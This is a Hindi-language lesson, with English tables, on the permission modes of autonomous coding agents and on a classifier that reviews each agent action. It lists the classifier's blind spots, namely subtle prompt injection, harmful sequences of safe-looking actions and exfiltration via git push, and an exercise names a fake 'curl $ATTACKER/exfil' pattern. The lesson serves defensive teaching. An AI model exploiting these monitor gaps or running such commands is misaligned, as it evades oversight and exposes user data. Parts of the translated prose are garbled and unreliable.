# स्वायत्त एजेंटों के लिए अनुमति मोड

> एक अनुमति सीढ़ी  समीक्षा से स्वायत्तता के डिग्री स्तर - हर कार्रवाई को मंजूरी देने के लिए - सब कुछ  यह है कि कैसे एक हर्नस नियंत्रित करता है कि एक स्वायत्त एजेंट बिना पूछे क्या कर सकता है। क्लाउड कोड, इस पाठ का कामकाजी उदाहरण, इस तरह के छह मोडों का खुलासा करता हैः "प्लान" प्रत्येक कार्रवाई से पहले पूछता है, "डिफ़ॉल्ट" (UI में "मैनुअल" लेबल) केवल जोखिम वाले लोगों के लिए पूछता है, "स्वीकार करेंसंपादित" स्वचालित रूप से फ़ाइल लिखता है लेकिन फिर भी खोल निष्पादन की पुष्टि करता है, और "बायपासपरमिशन" सब कुछ अनुमोदित करता है। ऑटो मोड  `auto`अनुमति मोड  प्रति कार्रवाई अनुमोदन को एक अलग वर्गीकरण मॉडल से बदल देता है जो प्रत्येक कार्रवाई को चलाने से पहले समीक्षा करता है और अनुरोध के लिए अनुरोध से परे किसी भी चीज को अवरुद्ध करता है। कार्रवाई के बजट को लागू किया जाता है`max_turns`और `max_budget_usd`. उपलब्धता `auto`योजना, org सक्षम, मॉडल और प्रदाता पर निर्भर करता है और मानव स्पष्ट है कि वर्गीकरण अकेले पर्याप्त नहीं है।

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## समस्या

आपकी मशीन पर एक स्वायत्त कोडिंग एजेंट एक अलग सुरक्षा श्रेणी है। हमले की सतह वह सब कुछ है जो एजेंट फ़ाइल सिस्टम, नेटवर्क, क्रेडेंशियल, क्लिपबोर्ड, किसी भी ब्राउज़र टैब, किसी भी खुले टर्मिनल तक पहुंच सकता है। ब्रूस श्नायर और अन्य ने इसे सार्वजनिक रूप से चिह्नित किया हैः कंप्यूटर उपयोग एजेंट चैटबॉट का "फ़िचर अपडेट" नहीं हैं, वे एक नई तरह के उपकरण हैं जो एक नई तरह की जोखिम प्रोफ़ाइल के साथ हैं।

क्लाउड कोड की अनुमति प्रणाली मानव विज्ञान का जवाब है। एक "स्वतंत्र / गैर-स्वतंत्र" स्विच के बजाय, क्षमता सीढ़ी में छह मोड हैंः योजना → डिफ़ॉल्ट → स्वीकार करेंसंपादित करें → ... → बायपासपरमिशन। प्रत्येक मोड गति और प्रति क्रिया समीक्षा के बीच एक अलग व्यापार है। ऑटो मोड (मार्च 2026) एक अलग वर्गीकरण मॉडल जोड़ता है जो उपयोगकर्ता के महत्वपूर्ण पथ से अनुमोदन को हटा देता हैः यह प्रत्येक कार्रवाई को चलाए जाने से पहले समीक्षा करता है और अनुरोध से परे बढ़ने वाली किसी भी चीज़ को अवरुद्ध करता है।

इंजीनियरिंग प्रश्नः यह प्रणाली क्या पकड़ती है, क्या यह चूक जाती है, और एक दिए गए कार्य के लिए वास्तव में किस मोड की आवश्यकता होती है?

## अवधारणा

### अनुमति के छह मोड

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(उपरोक्त नाम सार्वजनिक क्लाउड कोड दस्तावेजों से मेल खाते हैं; UI लेबल `default`"मैनुअल" के रूप में।

### एक पृष्ठ में ऑटो मोड

ऑटो मोड (24 मार्च, 2026 को लॉन्च किया गया) एक मॉडल पर प्रति कार्रवाई अनुमोदन को सौंपने के लिए पहली अनुमति मोड है। संरचनाः

1. **A separate classifier model.**यह प्रत्येक प्रस्तावित कार्य को निष्पादित करने से पहले समीक्षा करता है, घोषित कार्य और सत्र की वर्तमान स्थिति के आधार पर न्याय करता है, और अनुरोध के लिए आवश्यक से परे बढ़ने वाली किसी भी चीज़ को अवरुद्ध करता है। अवरुद्ध कार्य उपयोगकर्ता पर वापस आते हैं।
2. **Gated availability.**क्या `auto`योजना, संगठन सक्षम, मॉडल और प्रदाता पर निर्भर करता है।

बजट नियंत्रण वर्गीकरण के साथ-साथ स्थित हैंः

- `max_turns` एक सत्र में कुल पुनरावृत्ति।
- `max_budget_usd` डॉलर कैप जो सत्र को समाप्त करता है।
- प्रति उपकरण कार्य-गणना सीमा (नह से अधिक N `WebFetch`कॉल आदि) ।

### सिस्टम क्या पकड़ता है

- सीधे आगे के उपकरण इनपुट में त्वरित इंजेक्शन जहां इंजेक्टेड निर्देश एक ज्ञात जोखिमपूर्ण कार्रवाई के आकार को मैप करता है।
- दोहराव उपकरण लूप  वर्गीकरणकर्ता कार्रवाई N + 1 को देख सकता है लगभग समान है कार्रवाई N, पांच बार लगातार।
- स्पष्ट रूप से दायरे से बाहर shell आदेशों पर अन्यथा फ़ाइल संपादन के लिए ही सत्र.

### सिस्टम क्या याद कर सकता है

- **Subtle prompt injection**अप्रत्यक्ष शीघ्र इंजेक्शन एक पूरी तरह से पैच करने योग्य कमजोरियों नहीं है (OpenAI तैयारी हेड, 2025, ब्राउज़र एजेंट पर  देखें पाठ 11) ।
- **Semantic-level misbehavior.**प्रत्येक व्यक्तिगत क्रिया सुरक्षित लग सकती है जबकि गठित पटरियां हानिकारक होती हैं। वर्गीकरणकर्ता कार्रवाई का न्याय करता है; यह उपयोगकर्ता के इरादे को पुनः प्राप्त नहीं करता है।
- **Exfiltration through legitimate channels.**अपने पास फ़ाइल में डेटा लिखना, तो `git push`सार्वजनिक रेपो में अनुमति प्राप्त कार्यों का एक क्रम है, जिसकी संरचना समस्या है।

### अनुसंधान पूर्वावलोकन फ्रेमिंग

मानव अनुसंधान पूर्वावलोकन के रूप में ऑटो मोड भेजा। प्रलेखन स्पष्ट है कि वर्गीकरण एक परत है, समाधान नहींः उपयोगकर्ताओं को बजट, allowlists, अलग कार्यस्थानों और ट्रैकटोरिया ऑडिट के साथ ऑटो मोड को जोड़ने की उम्मीद है (पाठ 1216). पूर्वावलोकन फ्रेमिंग में प्रलेखित मूल्यांकन बनाम तैनाती अंतर (पढ़ना 1)  एक वर्गीकरण जो ऑफ़लाइन मूल्यांकन को पारित करता है, वास्तविक सत्र में अलग-अलग व्यवहार कर सकता है जहां उपयोगकर्ता का संदर्भ अस्पष्ट है।

### जहां यह सीढ़ी आपके कार्यप्रवाह में रहती है

- अनजान कार्यः शुरू करें `plan`योजना को पढ़ना एक खराब रन को पीछे रोल करने से सस्ता है।
- ज्ञात रिफैक्टर: `acceptEdits`पुष्टि क्लिक की एक बहुत बचाता है।
- अनियंत्रित पृष्ठभूमि रनः `auto`केवल एक कार्यक्षेत्र के भीतर जिसका विस्फोट त्रिज्या आपने मापा है (कोई क्रेडेंशियल, कोई उत्पादन माउंट नहीं, कोई निकास नहीं जिसे आपने चुना है) ।
- इफ़ेमरल कंटेनर: `dontAsk`/`bypassPermissions`स्वीकार्य है यदि और केवल यदि कंटेनर और उसके क्रेडेंशियल डिस्पोजेबल हों।

```figure
autonomy-oversight
```

## इसका प्रयोग करें

`code/main.py`दो चरणों के पाइपलाइन के रूप में एक कार्रवाई समीक्षा वर्गीकरण अनुकरण करता है  एक शिक्षण सरलता; वास्तविक `auto`मोड को एक अलग वर्गीकरण मॉडल द्वारा समर्थित किया जाता है, न कि एक प्रलेखित दो-चरण अनुबंध। चरण 1 प्रस्तावित कार्यों पर सस्ता कीवर्ड नियम है; चरण 2 एक धीमा बहु-नियम समीक्षाकर्ता है। चालक एक छोटे सिंथेटिक पटरियों (सुरक्षित कार्यों, एक शीघ्र इंजेक्शन प्रयास, एक दोहराव लूप) में फ़ीड करता है और दर्शाता है कि वर्गीकरणकर्ता कहां पकड़ता है और कहां चूकता है।

## इसे भेजें

`outputs/skill-permission-mode-picker.md`कार्य विवरण को सही अनुमति मोड, बजट सीमाओं और आवश्यक अलगाव के साथ मेल खाता है।

## व्यायाम

1. दौड़ें`code/main.py`किस कृत्रिम क्रिया प्रकार को कभी चरण 1 द्वारा चिह्नित नहीं किया जाता है, लेकिन हमेशा चरण 2 द्वारा पकड़ा जाता है?

2. चरण 1 नियम को एक विशिष्ट ज्ञात-बुरा आकार (जैसे, `curl $ATTACKER/exfil`) सौम्य क्रिया के नमूने पर झूठी सकारात्मकता दर को मापें।

3. एंथ्रोपिक के "एजेंट लूप कैसे काम करता है" दस्तावेज़ पढ़ें। सूचीबद्ध करें प्रत्येक बाहरी राज्य एजेंट डिफ़ॉल्ट रूप से स्पर्श करता है में `default`मोड. जो आप चलाने से पहले अलग से गेट की जरूरत होगी`auto`बिना निगरानी के?

4. 24 घंटे के बिना निगरानी वाले बजट का डिजाइन करें: `max_turns`,`max_budget_usd`, प्रति उपकरण टोपी, अनुमतिकारियों. प्रत्येक संख्या को सही ठहराना.

5. एक ऐसी प्रवृत्ति का वर्णन करें जहां प्रत्येक व्यक्तिगत क्रिया को वर्गीकरणकर्ता द्वारा अनुमोदित किया जाता है, फिर भी गठित व्यवहार गलत है। (पाठ 14 में शामिल है कि कैसे मार स्विच और कैनरी टोकन इस मुद्दे को संबोधित करते हैं) ।

## प्रमुख शर्तें

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## आगे पढ़ना

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) अनुमति मोड, बजट, कार्रवाई प्रारूप।
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) प्रबंधित सेवा निष्पादन मॉडल।
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) फीचर सतह और ऑटो मोड घोषणा।
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) तर्क आधारित परत जो वर्गीकरणकर्ता निर्णयों को आकार देती है।
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) दीर्घकालिक अनुमति डिजाइन पर आंतरिक दृष्टिकोण।
